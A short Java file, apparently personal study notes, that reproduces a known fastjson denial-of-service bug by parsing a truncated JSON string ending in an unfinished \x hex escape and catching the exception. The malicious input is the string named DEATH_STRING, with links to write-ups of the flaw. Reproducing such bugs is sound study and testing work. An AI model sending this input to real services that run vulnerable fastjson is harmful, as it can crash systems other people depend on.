package com.baymax.dailynotes.fastjson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONException;

/**
 * @author bx
 * @date 9/10/2019 9:11 AM
 * https://mp.weixin.qq.com/s/p0vLlguZHQfuAnYsk6dwxw
 * https://nosec.org/home/detail/2933.html
 */
public class FastJsonDos {
    public static void main(String[] args) {

        //{"a":"\x

        //是由于fastjson处理字符串中\x这种HEX字符表示形式出现的问题。

        String DEATH_STRING = "{\"a\":\"\\x";//输入字符串长度为8

        try {

            Object obj = JSON.parse(DEATH_STRING);

            System.out.println(obj);

        } catch (JSONException ex) {

            System.out.println(ex);

        }

    }
}
